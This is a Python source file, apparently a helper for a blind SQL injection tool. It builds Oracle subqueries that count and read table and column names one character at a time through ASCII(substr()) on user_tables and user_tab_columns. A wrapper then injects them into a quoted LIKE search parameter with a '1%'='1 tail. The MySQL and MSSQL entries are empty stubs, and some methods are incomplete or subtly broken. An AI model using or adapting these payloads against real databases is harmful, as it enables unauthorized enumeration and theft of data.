class attackQuerys:
    DB_table_count = {'oracle':"select count(TABLE_NAME) from user_tables",
                      'mysql':"",
                      'mssql':""}
    DB_table_length = {'oracle':"select length(TABLE_NAME) from(select TABLE_NAME,rownum as rnum from user_tables) where rnum={}",
                       'mysql':"",
                       'mssql':""}
    DB_table_data = {'oracle':"select ASCII(substr(TABLE_NAME,{},1)) from(select TABLE_NAME,rownum as rnum from user_tables)where rnum={}",
                       'mysql':"",
                       'mssql':""}

    DB_column_count= {'oracle':"select count(COLUMN_NAME) from user_tab_columns where TABLE_NAME={}",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}
    DB_column_length= {'oracle':"select length(COLUMN_NAME) from (select COLUMN_NAME, rownum as rnum from user_tab_columns where TABLE_NAME={}) where rnum={}",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}
    DB_column_data= {'oracle':"(select ascii(substr(COLUMN_NAME,1,1)) from (select COLUMN_NAME, rownum as rnum from user_tab_columns) where rnum={})",
                      'mysql':'information_schema.columns',
                      'mssql':'sys.columns'}

    def __init__(self, DB_type='oracle'):
        self.DB_type = DB_type
    
    

    def get_table_query(self,type,rnum=0):
        if type=='count':
            base_query = attackQuerys.DB_table_count[self.DB_type]
        elif type == 'length':
            base_query = attackQuerys.DB_table_length[self.DB_type]
            base_query= base_query.format(rnum)
        elif type== 'data':
            base_query = attackQuerys.DB_table_data[self.DB_type]
            base_query= base_query.format('{}',rnum)
        return "("+base_query+")"
    
    def get_column_query(self,type,table_name="",rnum=0):
        if type=='count':
            base_query = attackQuerys.DB_column_count[self.DB_type]
            base_query = base_query.format(f"'{table_name}'")
        elif type == 'length':
            base_query = attackQuerys.DB_column_length[self.DB_type]
            base_query = base_query.format(f"'{table_name}'",rnum)
        elif type== 'data':
            base_query = attackQuerys.DB_column_data[self.DB_type]
        return "("+base_query+")"
    
    def get_data_query(self,type):
        if type=='count':
            base_query = attackQuerys.DB_column_count[self.DB_type]
        elif type == 'length':
            base_query = attackQuerys.DB_column_length[self.DB_type]
        elif type== 'data':
            base_query = attackQuerys.DB_column_data[self.DB_type]
        return "("+base_query+")"
    
    
    
    def get_complete_query(keyword,query):
        return f"%{keyword}' and " +query+ " and '1%'='1"

        
